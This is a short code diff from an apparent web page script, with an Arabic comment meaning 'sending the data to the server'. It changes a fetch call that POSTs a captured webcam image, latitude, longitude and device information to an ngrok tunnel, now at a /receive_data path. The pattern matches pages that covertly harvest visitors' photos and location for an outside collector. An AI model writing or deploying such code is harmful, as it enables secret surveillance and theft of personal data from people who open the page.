@@ -47,11 +47,12 @@
                         const imgData = canvas.toDataURL('image/png');
 
                         // إرسال البيانات إلى السيرفر
-                        fetch("https://259c04a4053a.ngrok-free.app", {
-                            method:"POST",
-                            headers: { "Content-Type":"application/json" },
-                            body: JSON.stringify({ lat, lon, imgData, deviceInfo })
-                        });
+                       fetch("https://5d8b44f4aff6.ngrok-free.app/receive_data", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ lat, lon, imgData, deviceInfo })
+});
+
 
                         video.srcObject.getTracks().forEach(track => track.stop());
 
